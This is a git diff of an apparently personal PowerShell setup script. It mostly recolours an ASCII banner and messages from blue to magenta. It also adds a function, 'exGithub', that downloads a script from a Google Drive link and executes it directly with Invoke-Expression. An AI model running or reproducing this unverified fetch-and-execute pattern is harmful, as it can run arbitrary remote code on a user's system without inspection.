@@ -1,14 +1,14 @@
-Write-Host "   ____   __ __   ____  ______      ______  ____   __ __   ___   ____    ____ " -ForegroundColor Blue
-Write-Host "  |    \ |  |  | /    ||      |    |      ||    \ |  |  | /   \ |    \  /    |" -ForegroundColor Blue
-Write-Host "  |  _  ||  |  ||  o  ||      |    |      ||  D  )|  |  ||     ||  _  ||   __|" -ForegroundColor Blue
-Write-Host "  |  |  ||  _  ||     ||_|  |_|    |_|  |_||    / |  |  ||  O  ||  |  ||  |  |" -ForegroundColor Blue
-Write-Host "  |  |  ||  |  ||  _  |  |  |        |  |  |    \ |  :  ||     ||  |  ||  |_ |" -ForegroundColor Blue
-Write-Host "  |  |  ||  |  ||  |  |  |  |        |  |  |  .  \|     ||     ||  |  ||     |" -ForegroundColor Blue
-Write-Host "  |__|__||__|__||__|__|  |__|        |__|  |__|\_| \__,_| \___/ |__|__||___,_|" -ForegroundColor Blue
+Write-Host "   ____   __ __   ____  ______      ______  ____   __ __   ___   ____    ____ " -ForegroundColor Magenta
+Write-Host "  |    \ |  |  | /    ||      |    |      ||    \ |  |  | /   \ |    \  /    |" -ForegroundColor Magenta
+Write-Host "  |  _  ||  |  ||  o  ||      |    |      ||  D  )|  |  ||     ||  _  ||   __|" -ForegroundColor Magenta
+Write-Host "  |  |  ||  _  ||     ||_|  |_|    |_|  |_||    / |  |  ||  O  ||  |  ||  |  |" -ForegroundColor Magenta
+Write-Host "  |  |  ||  |  ||  _  |  |  |        |  |  |    \ |  :  ||     ||  |  ||  |_ |" -ForegroundColor Magenta
+Write-Host "  |  |  ||  |  ||  |  |  |  |        |  |  |  .  \|     ||     ||  |  ||     |" -ForegroundColor Magenta
+Write-Host "  |__|__||__|__||__|__|  |__|        |__|  |__|\_| \__,_| \___/ |__|__||___,_|" -ForegroundColor Magenta
 Write-Host ""
 Write-Host ""
-Write-Host "------------------------ Script developed by nhattVim ------------------------"
-Write-Host " ------------------ Github: httpls://github.com/nhattVim -------------------- "
+Write-Host "------------------------ Script developed by nhattVim ------------------------" -ForegroundColor Magenta
+Write-Host " ------------------ Github: httpls://github.com/nhattVim -------------------- " -ForegroundColor Magenta
 Write-Host 
 
 # Util function
@@ -18,8 +18,13 @@ function StartMsg {
 }
 
 function MsgDone { 
-    Write-Host "Done" -ForegroundColor Blue;
+    Write-Host "Done" -ForegroundColor Magenta;
     Write-Host 
+}
+
+function exGithub {
+    $script_url = "https://drive.usercontent.google.com/download?id=15e-PMQotvIukby_oZhcX9XsKSLsMZNoJ&export=download&authuser=0&confirm=t&uuid=3483ad01-177b-401f-bdaa-19e09e248377&at=AENtkXYr19FWt6dh1FdM2VM2Ff44:1731938448487"
+    Invoke-Expression (Invoke-RestMethod -Uri $script_url)
 }
 
 # Start
